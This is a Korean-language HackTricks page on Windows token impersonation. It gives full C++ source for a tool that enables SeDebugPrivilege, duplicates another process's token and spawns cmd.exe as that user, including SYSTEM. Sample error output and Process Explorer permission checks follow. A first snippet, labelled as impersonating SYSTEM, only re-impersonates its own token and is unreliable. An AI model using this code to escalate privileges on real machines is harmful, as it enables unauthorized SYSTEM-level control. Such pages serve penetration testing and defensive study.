<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출**하세요.

</details>


## 코드

다음 코드는 [여기](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)에서 가져왔습니다. **프로세스 ID를 인수로 지정**하고, 해당 프로세스의 사용자로 실행되는 CMD가 실행됩니다.\
고 인증 프로세스에서는 **시스템으로 실행되는 프로세스의 PID를 지정**할 수 있으며, 시스템으로 cmd.exe를 실행할 수 있습니다.
```cpp
impersonateuser.exe 1234
```
{% code title="impersonateuser.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>

BOOL ImpersonateSystem()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;
    BOOL bResult = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        printf("OpenProcessToken failed: %u\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        printf("LookupPrivilegeValue failed: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        printf("AdjustTokenPrivileges failed: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (!ImpersonateLoggedOnUser(hToken))
    {
        printf("ImpersonateLoggedOnUser failed: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    bResult = TRUE;

    CloseHandle(hToken);

    return bResult;
}

int main()
{
    if (ImpersonateSystem())
    {
        printf("Impersonated SYSTEM successfully!\n");
    }
    else
    {
        printf("Failed to impersonate SYSTEM!\n");
    }

    return 0;
}
```
{% endcode %}
```cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
{% endcode %}

## 오류

일부 경우에는 시스템을 가장하려고 시도하면 다음과 같은 출력이 나타나면서 작동하지 않을 수 있습니다:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
이는 현재 고도의 무결성 수준에서 실행 중이더라도 충분한 권한이 없다는 것을 의미합니다.\
**프로세스 탐색기**(또는 프로세스 해커를 사용할 수도 있음)를 사용하여 `svchost.exe` 프로세스에 대한 현재 관리자 권한을 확인해 봅시다.

1. `svchost.exe` 프로세스를 선택합니다.
2. 마우스 오른쪽 버튼 클릭 --> 속성
3. "보안" 탭에서 오른쪽 하단에 있는 "권한" 버튼을 클릭합니다.
4. "고급"을 클릭합니다.
5. "관리자"를 선택하고 "편집"을 클릭합니다.
6. "고급 권한 표시"를 클릭합니다.

![](<../../.gitbook/assets/image (322).png>)

이전 이미지에는 "관리자"가 선택한 프로세스에 대해 가지고 있는 모든 권한이 포함되어 있습니다 (`svchost.exe`의 경우 "쿼리" 권한만 가지고 있음을 확인할 수 있습니다).

`winlogon.exe`에 대해 "관리자"가 가지고 있는 권한을 확인해 봅시다:

![](<../../.gitbook/assets/image (323).png>)

해당 프로세스 내에서 "관리자"는 "메모리 읽기"와 "권한 읽기"를 할 수 있으며, 이는 관리자가 이 프로세스에서 사용되는 토큰을 가장할 수 있는 것으로 보입니다.
